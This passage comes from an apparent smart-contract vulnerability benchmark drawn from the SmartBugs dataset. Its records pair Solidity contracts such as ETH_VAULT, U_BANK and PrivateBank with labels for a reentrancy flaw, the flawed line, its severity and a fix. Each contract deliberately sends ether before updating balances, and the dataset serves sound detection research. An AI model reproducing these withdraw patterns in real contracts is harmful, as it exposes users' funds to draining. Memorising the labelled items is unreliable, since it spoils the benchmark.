    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 94\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n            // <yes> <report> REENTRANCY\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
    "vulnerable_function": "WithdrawToHolder",
    "vulnerable_lines": [
      94
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 94",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x7541b76cb60f4c60af330c208b0623b7f54bf615",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract U_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 2 ether;    \n\n    function U_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 29",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x7541b76cb60f4c60af330c208b0623b7f54bf615.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x7a8721a9d64c74da899424c1b52acbf58ddc9782",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 52\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateDeposit\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    address public owner;\n    \n    Log TransferLog;\n    \n    modifier onlyOwner() {\n        require(tx.origin == owner);\n        _;\n    }    \n    \n    function PrivateDeposit()\n    {\n        owner = msg.sender;\n        TransferLog = new Log();\n    }\n    \n    \n    \n    function setLog(address _lib) onlyOwner\n    {\n        TransferLog = Log(_lib);\n    }    \n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      52
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 52",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract W_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function W_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 29",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x8c7777c45481dba411450c228cb692ac3d550344",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x8c7777c45481dba411450c228cb692ac3d550344.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n \npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    Log TransferLog;\n    \n    uint public MinDeposit = 1 ether;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      41
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 41",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x93c32845fae42c83a70e5f06214c8433665c2ab5",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract X_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function X_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      29
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 29",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol",
    "pragma": "0.4.25",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x941d225236464a25eb18076df7da6a91d0f95e9e",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x941d225236464a25eb18076df7da6a91d0f95e9e.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_FUND\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    uint lastBlock;\n    \n    function ETH_FUND(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n            lastBlock = block.number;\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender]&&block.number>lastBlock)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      44
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 44",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract PENNY_BY_PENNY  \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      63
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 63",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract DEP_BANK \n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      54
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 54",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 40\n */\n\npragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function Private_Bank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      40
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 40",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _lib)\n    {\n        TransferLog = Log(_lib);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      38
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 38",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "CashOut",
    "vulnerable_lines": [
      41
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 41",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/reentrancy/0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol",
    "pragma": "0.4.19",
    "source_url": "etherscan.io"
  },
  {
    "id": "smartbugs_reentrancy_0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol",
    "file_content": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract MONEY_BOX   \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    Log LogFile;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        LogFile = Log(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "vulnerable_function": "Collect",
    "vulnerable_lines": [
      63
    ],
    "vulnerability_type": "reentrancy",
    "original_category": "reentrancy",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Reentrancy vulnerability - external call before state update allows recursive calls at line(s) 63",
    "fix_description": "Apply checks-effects-interactions pattern: update state before external calls, or use ReentrancyGuard",
    "is_vulnerable": true,
    "context_level": "single_file",
